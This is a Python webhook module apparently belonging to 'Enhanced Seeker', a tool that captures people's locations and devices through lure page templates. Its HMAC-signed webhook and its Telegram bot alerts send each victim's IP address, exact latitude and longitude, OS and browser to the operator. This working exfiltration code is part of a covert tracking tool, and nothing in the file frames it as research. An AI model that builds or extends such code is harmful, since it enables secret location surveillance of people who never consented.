"""
Webhook integration for external service notifications
"""

import requests
import json
import hmac
import hashlib
import time
import threading
from datetime import datetime
import logging
from config import Config

logger = logging.getLogger(__name__)

class WebhookManager:
    def __init__(self):
        self.webhook_url = Config.WEBHOOK_URL
        self.webhook_secret = Config.WEBHOOK_SECRET
        self.retry_attempts = 3
        self.timeout = 10
        
    def send_data(self, data, session_id=None):
        """Send data to webhook endpoint"""
        if not self.webhook_url:
            return
            
        # Prepare payload
        payload = {
            'timestamp': datetime.now().isoformat(),
            'source': 'enhanced_seeker',
            'version': '2.0.0',
            'session_id': session_id,
            'data': data
        }
        
        # Send asynchronously
        thread = threading.Thread(
            target=self._send_webhook_async,
            args=(payload, session_id)
        )
        thread.daemon = True
        thread.start()
        
    def _send_webhook_async(self, payload, session_id):
        """Send webhook asynchronously with retries"""
        for attempt in range(self.retry_attempts):
            try:
                # Prepare headers
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Enhanced-Seeker-Webhook/2.0'
                }
                
                # Add signature if secret is configured
                if self.webhook_secret:
                    signature = self._generate_signature(payload)
                    headers['X-Seeker-Signature'] = signature
                    
                # Send request
                response = requests.post(
                    self.webhook_url,
                    json=payload,
                    headers=headers,
                    timeout=self.timeout
                )
                
                # Log result
                if response.status_code == 200:
                    logger.info(f"Webhook sent successfully for session {session_id}")
                    self._log_webhook_attempt(session_id, payload, response.status_code, response.text)
                    return
                else:
                    logger.warning(f"Webhook failed with status {response.status_code} for session {session_id}")
                    
            except requests.exceptions.Timeout:
                logger.error(f"Webhook timeout for session {session_id} (attempt {attempt + 1})")
            except requests.exceptions.RequestException as e:
                logger.error(f"Webhook error for session {session_id}: {str(e)} (attempt {attempt + 1})")
            except Exception as e:
                logger.error(f"Unexpected webhook error for session {session_id}: {str(e)}")
                
            # Wait before retry
            if attempt < self.retry_attempts - 1:
                time.sleep(2 ** attempt)  # Exponential backoff
                
        logger.error(f"All webhook attempts failed for session {session_id}")
        self._log_webhook_attempt(session_id, payload, 0, "All attempts failed")
        
    def _generate_signature(self, payload):
        """Generate HMAC signature for webhook security"""
        payload_bytes = json.dumps(payload, sort_keys=True).encode('utf-8')
        signature = hmac.new(
            self.webhook_secret.encode('utf-8'),
            payload_bytes,
            hashlib.sha256
        ).hexdigest()
        return f"sha256={signature}"
        
    def _log_webhook_attempt(self, session_id, payload, status_code, response_body):
        """Log webhook attempt to database"""
        try:
            from database import Database
            db = Database()
            db.log_webhook(
                session_id=session_id,
                webhook_url=self.webhook_url,
                payload=json.dumps(payload),
                response_code=status_code,
                response_body=response_body[:1000]  # Limit response body length
            )
        except Exception as e:
            logger.error(f"Failed to log webhook attempt: {str(e)}")
            
    def test_webhook(self):
        """Test webhook endpoint with sample data"""
        test_payload = {
            'timestamp': datetime.now().isoformat(),
            'source': 'enhanced_seeker',
            'version': '2.0.0',
            'test': True,
            'message': 'Webhook test from Enhanced Seeker'
        }
        
        try:
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Enhanced-Seeker-Webhook/2.0'
            }
            
            if self.webhook_secret:
                signature = self._generate_signature(test_payload)
                headers['X-Seeker-Signature'] = signature
                
            response = requests.post(
                self.webhook_url,
                json=test_payload,
                headers=headers,
                timeout=self.timeout
            )
            
            return {
                'success': response.status_code == 200,
                'status_code': response.status_code,
                'response': response.text[:500]
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
            
    def send_telegram_notification(self, data, session_id):
        """Send notification via Telegram bot"""
        bot_token = Config.TELEGRAM_BOT_TOKEN
        chat_id = Config.TELEGRAM_CHAT_ID
        
        if not bot_token or not chat_id:
            return
            
        # Prepare message
        location = data.get('location', {})
        device = data.get('device', {})
        
        message = f"""
🎯 *Enhanced Seeker Alert*

*Session:* `{session_id}`
*Template:* {data.get('template', 'Unknown')}
*IP:* `{device.get('ip_address', 'Unknown')}`

*Location:*
• Lat: `{location.get('latitude', 'N/A')}`
• Lng: `{location.get('longitude', 'N/A')}`
• Accuracy: `{location.get('accuracy', 'N/A')}m`

*Device:*
• Platform: {device.get('parsed_ua', {}).get('os', {}).get('family', 'Unknown')}
• Browser: {device.get('parsed_ua', {}).get('browser', {}).get('family', 'Unknown')}

*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """.strip()
        
        # Send message
        thread = threading.Thread(
            target=self._send_telegram_async,
            args=(bot_token, chat_id, message)
        )
        thread.daemon = True
        thread.start()
        
    def _send_telegram_async(self, bot_token, chat_id, message):
        """Send Telegram message asynchronously"""
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {
                'chat_id': chat_id,
                'text': message,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, json=payload, timeout=self.timeout)
            
            if response.status_code == 200:
                logger.info("Telegram notification sent successfully")
            else:
                logger.error(f"Failed to send Telegram notification: {response.status_code}")
                
        except Exception as e:
            logger.error(f"Error sending Telegram notification: {str(e)}")
